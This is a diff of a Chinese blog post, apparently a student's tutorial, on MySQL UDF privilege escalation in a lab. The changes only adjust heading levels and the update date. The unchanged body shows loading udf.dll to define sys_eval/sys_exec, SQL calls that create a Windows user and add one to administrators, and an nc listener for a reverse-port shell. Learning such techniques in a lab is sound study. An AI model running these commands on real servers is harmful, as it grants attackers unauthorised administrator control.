@@ -14,7 +14,7 @@
 <meta property="og:description" content="前言最近在学习提权，什么都不懂，只能跟着学长们走一遍吧！！！ MOF提权待补充。。。。。。。。。。 UDF提权环境1234本机os： win10靶机os： win7php： 5.4.45mysql： 5.5.53  udf是什么udf：”user defined function”，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，性质就象使用本地MySQL函数如abs()或conc">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2019-07-18T01:37:05.000Z">
-<meta property="article:modified_time" content="2020-04-26T09:24:33.189Z">
+<meta property="article:modified_time" content="2020-04-27T00:45:39.105Z">
 <meta property="article:author" content="ca5tle">
 <meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary">
@@ -116,7 +116,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOF提权"><span class="toc-number">2.</span> <span class="toc-text">MOF提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UDF提权"><span class="toc-number">3.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-number">3.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#udf是什么"><span class="toc-number">3.2.</span> <span class="toc-text">udf是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何使用udf"><span class="toc-number">3.3.</span> <span class="toc-text">如何使用udf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用前提"><span class="toc-number">3.4.</span> <span class="toc-text">利用前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路过程"><span class="toc-number">3.5.</span> <span class="toc-text">思路过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#udf函数利用"><span class="toc-number">3.6.</span> <span class="toc-text">udf函数利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反弹端口提权"><span class="toc-number">4.</span> <span class="toc-text">反弹端口提权</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MOF提权"><span class="toc-number">2.</span> <span class="toc-text">MOF提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF提权"><span class="toc-number">3.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境"><span class="toc-number">3.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf是什么"><span class="toc-number">3.2.</span> <span class="toc-text">udf是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何使用udf"><span class="toc-number">3.3.</span> <span class="toc-text">如何使用udf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用前提"><span class="toc-number">3.4.</span> <span class="toc-text">利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路过程"><span class="toc-number">3.5.</span> <span class="toc-text">思路过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf函数利用"><span class="toc-number">3.6.</span> <span class="toc-text">udf函数利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹端口提权"><span class="toc-number">4.</span> <span class="toc-text">反弹端口提权</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -142,7 +142,7 @@
       
         <time datetime="2019-07-18T01:37:05.000Z" itemprop="datePublished">2019-07-18</time>
         
-        (Updated: <time datetime="2020-04-26T09:24:33.189Z" itemprop="dateModified">2020-04-26</time>)
+        (Updated: <time datetime="2020-04-27T00:45:39.105Z" itemprop="dateModified">2020-04-27</time>)
         
       
     </div>
@@ -167,23 +167,23 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习提权，什么都不懂，只能跟着学长们走一遍吧！！！</p>
-<h1 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h1><p>待补充。。。。。。。。。。</p>
-<h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a><strong>环境</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">本机os： win10</span><br><span class="line">靶机os： win7</span><br><span class="line">php： 5.4.45</span><br><span class="line">mysql： 5.5.53</span><br></pre></td></tr></table></figure>
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习提权，什么都不懂，只能跟着学长们走一遍吧！！！</p>
+<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>待补充。。。。。。。。。。</p>
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a><strong>环境</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">本机os： win10</span><br><span class="line">靶机os： win7</span><br><span class="line">php： 5.4.45</span><br><span class="line">mysql： 5.5.53</span><br></pre></td></tr></table></figure>
 
-<h2 id="udf是什么"><a href="#udf是什么" class="headerlink" title="udf是什么"></a>udf是什么</h2><p>udf：”user defined function”，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，性质就象使用本地MySQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于”mysql/lib/plugin”目录下，文件后缀为”.dll”，常用c语言编写。</p>
-<h2 id="如何使用udf"><a href="#如何使用udf" class="headerlink" title="如何使用udf"></a>如何使用udf</h2><p>假设我的udf文件名为‘udf.dll’，存放在Mysql根目录(通过select @@basedir可知)的‘lib/plugin’目录下。在udf中，我定义了名为sys_eval的mysql函数，可以执行系统任意命令。如果我现在就打开mysql命令行，使用select sys_eval(‘dir’);的话，系统会返回sys_eval()函数未定义。因为我们仅仅是把‘udf.dll’放到了某个文件夹里，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。</p>
+<h3 id="udf是什么"><a href="#udf是什么" class="headerlink" title="udf是什么"></a>udf是什么</h3><p>udf：”user defined function”，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，性质就象使用本地MySQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于”mysql/lib/plugin”目录下，文件后缀为”.dll”，常用c语言编写。</p>
+<h3 id="如何使用udf"><a href="#如何使用udf" class="headerlink" title="如何使用udf"></a>如何使用udf</h3><p>假设我的udf文件名为‘udf.dll’，存放在Mysql根目录(通过select @@basedir可知)的‘lib/plugin’目录下。在udf中，我定义了名为sys_eval的mysql函数，可以执行系统任意命令。如果我现在就打开mysql命令行，使用select sys_eval(‘dir’);的话，系统会返回sys_eval()函数未定义。因为我们仅仅是把‘udf.dll’放到了某个文件夹里，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。</p>
 <p>所以，我们应该把‘udf.dll’中的自定义函数引入进来。</p>
 <p>实例用法：</p>
 <p><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.dll&#39;;</code></p>
 <p>只有两个变量，一个是function_name(函数名)，这里用的是sys_eval；还有一个变量是shared_library_name(共享包名称)，即udf.dll。</p>
 <p>这个函数用于执行系统命令，用法如下：</p>
 <p><code>select sys_eval(&#39;cmd command&#39;);</code></p>
-<h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a><strong>利用前提</strong></h2><ul>
+<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a><strong>利用前提</strong></h3><ul>
 <li>掌握MySQL数据库的账户，拥有对MySQL的insert和delete权限，用来创建和抛弃函数</li>
 <li>拥有可以将udf.dll写入相应目录的权限</li>
 </ul>
-<h2 id="思路过程"><a href="#思路过程" class="headerlink" title="思路过程"></a>思路过程</h2><p><strong>整理一下思路：</strong></p>
+<h3 id="思路过程"><a href="#思路过程" class="headerlink" title="思路过程"></a>思路过程</h3><p><strong>整理一下思路：</strong></p>
 <ol>
 <li>将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）</li>
 <li>从udf文件中引入自定义函数(user defined function)</li>
@@ -218,10 +218,10 @@
 <p><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.dll&#39;; //导入udf函数</code></p>
 <p>导入成功的话就可以使用了：</p>
 <p><code>SELECT sys_eval(&#39;ipconfig&#39;);  //返回网卡信息</code></p>
-<h2 id="udf函数利用"><a href="#udf函数利用" class="headerlink" title="udf函数利用"></a>udf函数利用</h2><p>介绍一种最常用的函数sys_exec</p>
+<h3 id="udf函数利用"><a href="#udf函数利用" class="headerlink" title="udf函数利用"></a>udf函数利用</h3><p>介绍一种最常用的函数sys_exec</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create function sys_exec returns string soname &#39;udf.dll&#39;;#导入该函数</span><br><span class="line">select sys_exec(&#39;net user test 123456 &#x2F;add&#39;);#创建test用户</span><br><span class="line">select sys_exec(&#39;net localgroup administrators xutest &#x2F;add&#39;); #提升到超级用户组</span><br><span class="line">drop function sys_exec;#删除该函数</span><br></pre></td></tr></table></figure>
 
-<h1 id="反弹端口提权"><a href="#反弹端口提权" class="headerlink" title="反弹端口提权"></a>反弹端口提权</h1><p>实质是udf提权</p>
+<h2 id="反弹端口提权"><a href="#反弹端口提权" class="headerlink" title="反弹端口提权"></a>反弹端口提权</h2><p>实质是udf提权</p>
 <p>先在另一台服务器上开启端口监听</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lv@ubuntu:~$ nc -vv -l -p 12345</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 12345)</span><br></pre></td></tr></table></figure>
 
@@ -278,7 +278,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOF提权"><span class="toc-number">2.</span> <span class="toc-text">MOF提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UDF提权"><span class="toc-number">3.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-number">3.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#udf是什么"><span class="toc-number">3.2.</span> <span class="toc-text">udf是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何使用udf"><span class="toc-number">3.3.</span> <span class="toc-text">如何使用udf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用前提"><span class="toc-number">3.4.</span> <span class="toc-text">利用前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路过程"><span class="toc-number">3.5.</span> <span class="toc-text">思路过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#udf函数利用"><span class="toc-number">3.6.</span> <span class="toc-text">udf函数利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反弹端口提权"><span class="toc-number">4.</span> <span class="toc-text">反弹端口提权</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MOF提权"><span class="toc-number">2.</span> <span class="toc-text">MOF提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF提权"><span class="toc-number">3.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境"><span class="toc-number">3.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf是什么"><span class="toc-number">3.2.</span> <span class="toc-text">udf是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何使用udf"><span class="toc-number">3.3.</span> <span class="toc-text">如何使用udf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用前提"><span class="toc-number">3.4.</span> <span class="toc-text">利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路过程"><span class="toc-number">3.5.</span> <span class="toc-text">思路过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf函数利用"><span class="toc-number">3.6.</span> <span class="toc-text">udf函数利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹端口提权"><span class="toc-number">4.</span> <span class="toc-text">反弹端口提权</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
